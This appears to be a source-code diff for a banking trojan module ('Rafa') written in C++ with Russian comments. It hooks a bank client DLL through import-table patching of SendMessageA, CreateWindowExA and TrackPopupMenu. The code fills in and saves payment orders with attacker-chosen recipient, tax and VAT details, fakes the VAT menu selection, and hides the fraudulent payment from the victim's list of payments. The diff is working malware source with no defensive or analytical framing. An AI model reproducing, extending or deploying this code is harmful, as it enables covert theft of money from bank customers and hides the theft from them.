@@ -28,9 +28,10 @@ namespace Rafa
 
 LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
 HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
+BOOL (WINAPI *pHandlerTrackPopupMenu)(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect ); 
 
 WNDPROC MainWndProc; //оконная процедура главного окна клиента
-
+WNDPROC PaymentWndProc; //оконная процедура окна ввода платежки
 
 //контрол формы, для автоматического заполнения формы данными
 struct ControlForm
@@ -55,10 +56,12 @@ struct PaymentOrder
 	char* sendAcc; //счет отправителя
 	char* sum; //сумма
 	char* inn;
+	char* kpp;
 	char* bik;
 	char* recvAcc; //счет получателя
 	char* recvName; //название получателя
 	char* comment; //назначение платежа
+	char* nds;
 	char* bankName; //наименование банка получателя
 	char* bankCity; //город банка получателя
 	char* bankAcc; //счет банка получателя
@@ -106,6 +109,8 @@ int c_lvRows = 0; //количество строк в lvRows, определяется по сообщению LVM_INS
 int begHideRows = 0; //с какой строки начинаются невидимые строки
 int identHidePayment = 0; //флаги: 1 - совпал получатель, 2 - совпала сумма, 4 - совпало назначение
 const int fullIdent = 1 + 2 + 4; //при этом значении считаем, что наша платежка идентифицирована
+
+int retMenuNds = 0; //возвращаемое значение при віборе меню НДС
 
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
@@ -275,7 +280,6 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			break;
 		}
 	}
-
 	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
 }
 
@@ -296,6 +300,18 @@ static bool FindPaymentForIdent( const char* s, int id )
 	return false;
 }
 
+/*
+static LRESULT WINAPI HandlerPaymentWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
+{
+	if( (stateFakeWindow & 5) == 5 )
+	{
+		DBGRAFA( "-------0", "%x (%08x,%08x)", Msg, wParam, lParam );
+	}
+	LRESULT ret = PaymentWndProc( hWnd, Msg, wParam, lParam );
+	return ret;
+}
+*/
+
 static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
 	int iRealItem;
@@ -306,12 +322,24 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 			NMHDR* pdi = (NMHDR*)lParam;
 			if( pdi->hwndFrom == listView )
 			{
-				NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
-				if( pdi->code == LVN_GETDISPINFO )
+				switch( pdi->code )
 				{
-					//перекодируем номер строки
-					iRealItem = p->item.iItem;
-					p->item.iItem = lvRows[iRealItem];
+					case LVN_GETDISPINFO:
+					{
+						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
+						//перекодируем номер строки
+						iRealItem = p->item.iItem;
+						p->item.iItem = lvRows[iRealItem];
+					}
+					break;
+					case NM_CLICK:
+					{
+						NMITEMACTIVATE* p = (NMITEMACTIVATE*)lParam;
+						DBGRAFA( "++++++++++", "%d %d", p->hdr.idFrom, wParam );
+						if( p->iItem >= begHideRows )
+							return 0;
+					}
+					break;
 				}
 			}
 			break;
@@ -327,71 +355,91 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 			NMHDR* pdi = (NMHDR*)lParam;
 			if( pdi->hwndFrom == listView )
 			{
-				if( pdi->code == LVN_GETDISPINFO )
+				switch( pdi->code )
 				{
-					NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
-					if( p->item.mask & LVIF_TEXT )
+					case LVN_GETDISPINFO:
 					{
-						switch( p->item.iSubItem )
+						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
+						if( p->item.mask & LVIF_TEXT )
 						{
-							case 5: //получатель
-								if( FindPaymentForIdent( p->item.pszText, 0 ) )
-									identHidePayment |= 1;
-								else
-									identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
-								break;
-							case 4: //сумма
-								if( FindPaymentForIdent( p->item.pszText, 1 ) )
-									identHidePayment |= 2;
-								else
-									identHidePayment = 0; 
-								break;
-							case 6: //назначение
-								if( FindPaymentForIdent( p->item.pszText, 2 ) )
-									identHidePayment |= 4;
-								else
-									identHidePayment = 0; 
-								break;
-						}
-						if( identHidePayment == fullIdent ) //наша платежка идентифицирована
-						{
-							DBGRAFA( "Rafa", "Идентифицировали платежку %d", iRealItem );
-							//ищем индекс платежки в нашем массиве
-							int idx = -1;
-							for( int i = 0; i < c_lvRows; i++ )
-								if( lvRows[i] == iRealItem )
-								{
-									idx = i;
-									break;
-								}
-							if( idx < begHideRows ) //платежка еще не скрыта
+							switch( p->item.iSubItem )
 							{
-								//переносим номер этой платежки в самый низ, остальные поднимаем выше
-								int num = lvRows[idx]; //запомнили порядковый номер платежки
-								for( int i = idx; i < c_lvRows - 1; i++ )
-									lvRows[i] = lvRows[i + 1];
-								begHideRows--;
-								lvRows[c_lvRows - 1] = num;
+								case 5: //получатель
+									if( FindPaymentForIdent( p->item.pszText, 0 ) )
+										identHidePayment |= 1;
+									else
+										identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
+									break;
+								case 4: //сумма
+									if( FindPaymentForIdent( p->item.pszText, 1 ) )
+										identHidePayment |= 2;
+									else
+										identHidePayment = 0; 
+									break;
+								case 6: //назначение
+									if( FindPaymentForIdent( p->item.pszText, 2 ) )
+										identHidePayment |= 4;
+									else
+										identHidePayment = 0; 
+									break;
 							}
-							identHidePayment = 0;
-							pUpdateWindow(listView); //обновляем таблицу
+							if( identHidePayment == fullIdent ) //наша платежка идентифицирована
+							{
+								DBGRAFA( "Rafa", "Идентифицировали платежку %d", iRealItem );
+								//ищем индекс платежки в нашем массиве
+								int idx = -1;
+								for( int i = 0; i < c_lvRows; i++ )
+									if( lvRows[i] == iRealItem )
+									{
+										idx = i;
+										break;
+									}
+								if( idx < begHideRows ) //платежка еще не скрыта
+								{
+									//переносим номер этой платежки в самый низ, остальные поднимаем выше
+									int num = lvRows[idx]; //запомнили порядковый номер платежки
+									for( int i = idx; i < c_lvRows - 1; i++ )
+										lvRows[i] = lvRows[i + 1];
+									begHideRows--;
+									lvRows[c_lvRows - 1] = num;
+									//если строка выделена, то сбрасываем выделение
+									DWORD res = (DWORD)pSendMessageA( listView, LVM_GETITEMSTATE, (WPARAM)iRealItem, (LPARAM)LVIS_SELECTED );
+									if( res & LVIS_SELECTED )
+									{
+										LVITEM item;
+										item.stateMask = LVIS_SELECTED;
+										item.state = 0;
+										pSendMessageA( listView, LVM_SETITEMSTATE, (WPARAM)-1, (LPARAM)&item );
+										NMITEMACTIVATE nm;
+										ClearStruct(nm);
+										nm.hdr.code = NM_CLICK;
+										nm.hdr.hwndFrom = listView;
+										nm.hdr.idFrom = 0;
+										nm.iItem = -1;
+										pSendMessageA( listView, WM_NOTIFY, (WPARAM)0, (LPARAM)&nm );
+									}
+									pSendMessageA( listView, LVM_REDRAWITEMS, (WPARAM)0, (LPARAM)(c_lvRows - 1) );
+									//pUpdateWindow(listView); //обновляем таблицу
+								}
+								identHidePayment = 0;
+							}
 						}
-						//DBGRAFA( "Rafa*****", "i = %d,%d '%s'", p->item.iItem, p->item.iSubItem, p->item.pszText );
 					}
-				}
-				if( pdi->code == NM_CUSTOMDRAW )
-				{
-					NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
-					if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
+					break;
+					case NM_CUSTOMDRAW:
 					{
-						ret |= CDRF_NOTIFYITEMDRAW;
-					}
-					if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
-					{
-						if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
-							ret = CDRF_SKIPDEFAULT;
-						else
-							ret = CDRF_NEWFONT;
+						NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
+						if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
+						{
+							ret |= CDRF_NOTIFYITEMDRAW;
+						}
+						if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
+						{
+							if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
+								ret = CDRF_SKIPDEFAULT;
+							else
+								ret = CDRF_NEWFONT;
+						}
 					}
 				}
 			}
@@ -433,6 +481,16 @@ static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, P
 		}
 	}
 	return hWnd;
+}
+
+static BOOL WINAPI HandlerTrackPopupMenu( HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect )
+{
+	if( stateFakeWindow & 8 )
+	{
+		stateFakeWindow &= ~8; //меню вызвано
+		return retMenuNds;
+	}
+	return pHandlerTrackPopupMenu( hMenu, uFlags, x, y, nReserved, hWnd, prcRect );
 }
 
 static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
@@ -647,7 +705,7 @@ static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
 }
 
 //ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
-//контролов. Массив cfOut должен выделен на тоже количество элементов что и cfIn
+//контролов. Массив cfOut должен быть выделен на тоже количество элементов что и cfIn
 static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
 {
 	ForFindControls ffc;
@@ -981,8 +1039,10 @@ static void WorkInRafa()
 							}
 							if( formPayment )
 							{
+								//PaymentWndProc = (WNDPROC)SetWindowLongPtr( formPayment, GWLP_WNDPROC, (LONG_PTR)HandlerPaymentWndProc );
 								DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
 								stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
+								pSleep(2000); //ждем пока окно полностью инициализируется
 								//ищем контролы в которые будем вводить
 								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
 								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
@@ -993,7 +1053,7 @@ static void WorkInRafa()
 									//SetText( "status", "2", cf, countControls );
 									SetText( "sum", po->sum, cf, countControls );
 									SetText( "innrecv", po->inn, cf, countControls );
-									//SetText( "kpprecv", "770501001", cf, countControls );
+									SetText( "kpprecv", po->kpp, cf, countControls );
 									SetText( "accountrecv", po->recvAcc, cf, countControls );
 									SetText( "namerecv", po->recvName, cf, countControls );
 									SetText( "bikrecv", po->bik, cf, countControls );
@@ -1001,14 +1061,31 @@ static void WorkInRafa()
 									SetText( "accbankrecv", po->bankAcc, cf, countControls );
 									SetText( "punktrecv", po->bankCity, cf, countControls );
 									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
-									SetButtonCheck( "sended", true, cf, countControls );
-									//сохраняем платежку
+
+									stateFakeWindow |= 8; //ловим всплывающее мени НДС
+									retMenuNds = po->nds[0] == '0' ? 4 : 5; //что нужно выбрать в меню НДС (4 - без ндс, 5 - с ндс)
+									ClickButton( "nds", cf, countControls ); //кликаем на кнопку, которая открывает меню NDS
+									//ждем появления меню, на самом деле оно не появится, просто функция TrackPopupMenu сразу вернет нужное нам значение
+									for( int i = 0; i < 10; i++ )
+									{
+										if( (stateFakeWindow & 8) == 0 ) break;
+										pSleep(500);
+									}
+									ControlFinded* ctrl = GetControl( "sended", cf, countControls );
+									if( ctrl ) 
+									{
+										SetButtonCheck( "sended", true, cf, countControls );
+										pSendMessageA( formPayment, WM_COMMAND, 0, (LPARAM)ctrl->wnd );
+									}
+
+									//сохраняем платежку								
 									ClickButton( "save", cf, countControls );
 									pSleep(5000); //ждем пока сохранится
 									//сворачиваем дерево до первоначального состояния
 									TreeViewCollapse( itemAcc->itemTmpls, 4 );
 									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
 									po->entered = true;
+									
 									SavePaymentOrders();
 								}
 								HEAP::Free(cf);
@@ -1042,6 +1119,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			{
 				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
 				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
+				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );			
 				if( res )
 				{
 					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
@@ -1276,10 +1354,12 @@ static PaymentOrder* GetPaymentOrders()
 			po->sendAcc = to; from = CopyDataPayment( to, from );
 			po->sum = to; from = CopyDataPayment( to, from );
 			po->inn = to; from = CopyDataPayment( to, from );
+			po->kpp = to; from = CopyDataPayment( to, from );
 			po->bik = to; from = CopyDataPayment( to, from );
 			po->recvAcc = to; from = CopyDataPayment( to, from );
 			po->recvName = to; from = CopyDataPayment( to, from );
 			po->comment = to; from = CopyDataPayment( to, from );
+			po->nds = to; from = CopyDataPayment( to, from );
 			po->bankName = to; from = CopyDataPayment( to, from );
 			po->bankCity = to; from = CopyDataPayment( to, from );
 			po->bankAcc = to; from = CopyDataPayment( to, from );
@@ -1288,10 +1368,12 @@ static PaymentOrder* GetPaymentOrders()
 			DBGRAFA( "Rafa", "sendAcc '%s'", po->sendAcc );
 			DBGRAFA( "Rafa", "sum '%s'", po->sum );
 			DBGRAFA( "Rafa", "inn '%s'", po->inn );
+			DBGRAFA( "Rafa", "kpp '%s'", po->kpp );
 			DBGRAFA( "Rafa", "bik '%s'", po->bik );
 			DBGRAFA( "Rafa", "recvAcc '%s'", po->recvAcc );
 			DBGRAFA( "Rafa", "recvName '%s'", po->recvName );
 			DBGRAFA( "Rafa", "comment '%s'", po->comment );
+			DBGRAFA( "Rafa", "nds'%s'", po->nds );
 			DBGRAFA( "Rafa", "bankName '%s'", po->bankName );
 			DBGRAFA( "Rafa", "bankCity '%s'", po->bankCity );
 			DBGRAFA( "Rafa", "bankAcc '%s'", po->bankAcc );
